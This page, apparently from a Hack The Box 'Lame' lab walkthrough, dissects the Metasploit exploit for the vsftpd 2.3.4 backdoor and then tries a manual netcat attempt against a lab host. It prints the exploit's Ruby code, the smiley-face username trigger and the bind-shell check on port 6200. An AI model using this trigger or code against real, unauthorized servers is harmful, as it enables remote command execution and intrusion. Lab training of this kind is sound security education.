.. _Lame Exploitation:

Exploitation
============

+-------------+----------------------+
|**Reference**|:ref:`netcat <netcat>`|
|             |                      |
|             |:ref:`nmap <nmap>`    |
|             |                      |
|             |:ref:`SearchSploit`   |
+-------------+----------------------+


Time to test the mettle of the exploits we uncovered. As before, we'll start from the top.

.. index:: SearchSploit


vsftpd 2.3.4
------------
Using the ``-x`` flag with `SearchSploit`, let's examine the source code of the `vsftpd` exploit:

.. code-block:: none

    kali@kali:~/HTB/Lame$ searchsploit -x 17491
      Exploit: vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)
          URL: https://www.exploit-db.com/exploits/17491
         Path: /usr/share/exploitdb/exploits/unix/remote/17491.rb
    File Type: Ruby script, ASCII text, with CRLF line terminators

This exploit is written for `Metasploit`. It's not terribly complex, and with a little effort we can piece together what the exploit does. The most important section of code is the ``exploit`` function. Let's break it down.

The first part of the function connects to the target FTP service, then grabs the banner:

.. code-block:: ruby

    def exploit
    [...]
            # Connect to the FTP service port first
            connect

            banner = sock.get_once(-1, 30).to_s
            print_status("Banner: #{banner.strip}")

With the connection established, the script sends a specially-crafted username:

.. code-block:: ruby

            sock.put("USER #{rand_text_alphanumeric(rand(6)+1)}:)\r\n")
            resp = sock.get_once(-1, 30).to_s
            print_status("USER: #{resp.strip}")

The ``#{rand_text_alphanumeric(rand(6)+1)}`` bit generates a string of one to six random alphanumeric characters. Let's substitute ``XXXX`` and see what the ``sock.put`` function is sending to the FTP server:

.. code-block:: none

    USER XXXX:)\r\n

Dissecting this, we can see that the script is issuing the ``USER`` command to authenticate with the remote FTP service. Next, it sends ``XXXX``, followed by ``:)`` (a smiley-face), followed by ``\r\n``, which tells the FTP server that the command is complete.

Based on this information, it looks like any username will do, as long as it's followed by the ``:)`` smiley.

After sending the crafted username, the script checks the response from the server. It checks whether the return value starts with ``530``, or any other response code besides ``331``, which would signal the failure of the exploit attempt:

.. code-block:: ruby

            if resp =~ /^530 /
                    print_error("This server is configured for anonymous only and the backdoor code cannot be reached")
                    disconnect
                    return
            end

            if resp !~ /^331 /
                    print_error("This server did not respond as expected: #{resp.strip}")
                    disconnect
                    return
            end

If the response code was ``331``, the script proceeds to send a randomly-generated password to the FTP service:

.. code-block:: ruby

            sock.put("PASS #{rand_text_alphanumeric(rand(6)+1)}\r\n")

But this password is irrelevant; simply by sending the appropriate ``USER`` and ``PASS`` commands, the exploit should have triggered the backdoor. In this case, the backdoor opens a bind shell on port 6200, so the script checks to see if that port is open:

.. code-block:: ruby

            # Do not bother reading the response from password, just try the backdoor
            nsock = self.connect(false, {'RPORT' => 6200}) rescue nil

If the port was opened successfully, the script connects and provides a command-line backdoor to the target:

.. code-block:: ruby

            if nsock
                    print_good("Backdoor service has been spawned, handling...")
                    handle_backdoor(nsock)
                    return
            end

            disconnect

    end

.. index:: nmap

Now that we know how the exploit works, we no longer need it. This exploit is simple enough that we can attempt it by hand. Recall that in our original port scan, port 6200 was not open. We can double-check this easily with `nmap`:

.. code-block:: none

    kali@kali:~/HTB/Lame$ nmap -Pn -p 6200 10.10.10.3
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-28 14:45 EDT
    Nmap scan report for 10.10.10.3
    Host is up.

    PORT     STATE    SERVICE
    6200/tcp filtered lm-x

    Nmap done: 1 IP address (1 host up) scanned in 2.14 seconds

.. index:: netcat

The port is marked as `filtered`, which means `nmap` could not tell whether the port was closed or open. Let's see if `netcat` can shed any light on the situation:

.. code-block:: none

    kali@kali:~/HTB/Lame$ nc -vn -w 3 10.10.10.3 6200
    (UNKNOWN) [10.10.10.3] 6200 (?) : Connection timed out

The port is refusing to connect. Now that we've proven the port to be closed (at least to the outside), let's see if we can exploit the service. We'll use `netcat` again, this time connecting to port 21 to send the appropriate exploit values:

.. code-block:: none

    kali@kali:~/HTB/Lame$ nc 10.10.10.3 21
    220 (vsFTPd 2.3.4)
    USER TEST:)
    331 Please specify the password.
    PASS WHATEVER

Having sent the username with the smiley-face, and an appropriate password, we can check port 6200 again to see if the backdoor was opened:

.. code-block:: none

    kali@kali:~/HTB/Lame$ nc -vn -w 3 10.10.10.3 6200
    (UNKNOWN) [10.10.10.3] 6200 (?) : Connection timed out

No such luck. It appears that either this is a patched version of `vsftpd`, or port 6200 is being blocked by the firewall. Either way, it's time to move to our next target.
